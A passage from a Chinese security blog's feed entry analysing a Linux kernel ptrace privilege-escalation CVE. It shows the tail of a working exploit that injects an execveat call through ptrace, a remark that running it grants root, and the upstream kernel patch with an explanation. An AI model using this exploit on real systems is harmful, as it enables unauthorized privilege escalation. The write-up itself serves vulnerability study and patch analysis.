class="hljs-comment">// copy to child stack</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; idx; i++)<br>        ptrace(PTRACE_POKETEXT, child_pid, child_stack + i * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>), insert_data[i]);<br><br>    <span class="hljs-comment">// execveat(exec_fd, NULL, argv, NULL, flags)</span><br>    regs.orig_rax = __NR_execveat;<br>    regs.rdi = exec_fd;<br>    regs.rsi = child_stack + <span class="hljs-number">0x20</span>;  <span class="hljs-comment">// path -&gt; NULL</span><br>    regs.rdx = child_stack;         <span class="hljs-comment">// argv -&gt; &quot;stagex&quot;, NULL</span><br>    regs.r10 = child_stack + <span class="hljs-number">0x10</span>;  <span class="hljs-comment">// envp -&gt; NULL</span><br>    regs.r8  = AT_EMPTY_PATH;       <span class="hljs-comment">// flags</span><br><br>    ptrace(PTRACE_SETREGSET, child_pid, NT_PRSTATUS, &amp;iov);<br>    ptrace(PTRACE_DETACH, child_pid, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>    waitpid(child_pid, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>运行即可完成提权</p><p><img src="https://s2.loli.net/2022/01/17/VgmbRFaIZo3qY8u.png" alt="image.png"></p><h1>0x03.漏洞修复</h1><p>Jann Horn 提交的漏洞修复方案比较简单，如下：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-comment">diff --git a/kernel/ptrace.c b/kernel/ptrace.c</span><br><span class="hljs-comment">index 8456b6e2205f7..705887f63288d 100644</span><br><span class="hljs-comment">--- a/kernel/ptrace.c</span><br><span class="hljs-comment">+++ b/kernel/ptrace.c</span><br><span class="hljs-meta">@@ -79,9 +79,7 @@</span> void __ptrace_link(struct task_struct *child, struct task_struct *new_parent,<br>  */<br> static void ptrace_link(struct task_struct *child, struct task_struct *new_parent)<br> &#123;<br><span class="hljs-deletion">-rcu_read_lock();</span><br><span class="hljs-deletion">-__ptrace_link(child, new_parent, __task_cred(new_parent));</span><br><span class="hljs-deletion">-rcu_read_unlock();</span><br><span class="hljs-addition">+__ptrace_link(child, new_parent, current_cred());</span><br> &#125;<br></code></pre></td></tr></table></figure><p>我们可以看出这个补丁只做了一件小事：</p><ul><li><strong>不使用 rcu 机制，将 ptracee-&gt;parent_cred 设为当前进程 cred，即 ptracee 原来的 cred</strong></li></ul><p>这将 ptracer 的权限限制为发起 ptrace 请求的 ptracee 的权限，笔者个人认为这个修复还是比较成功的</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;你不许说他，他是你爹？&lt;/p&gt;</summary>
    
    
    
    <category term="CVE" scheme="http://blog.arttnba3.cn/categories/CVE/"/>
    
    
    <category term="Linux" scheme="http://blog.arttnba3.cn/tags/Linux/"/>
    
    <category term="Linux Kernel" scheme="http://blog.arttnba3.cn/tags/Linux-Kernel/"/>
    
    <category term="Pwn" scheme="http://blog.arttnba3.cn/tags/Pwn/"/>
    
    <category term="CVE" scheme="http://blog.arttnba3.cn/tags/CVE/"/>
    
    <category term="提权" scheme="http://blog.arttnba3.cn/tags/%E6%8F%90%E6%9D%83/"/>
    
    <category term="ptrace" scheme="http://blog.arttnba3.cn/tags/ptrace/"/>
    
  </entry>
  
</feed>
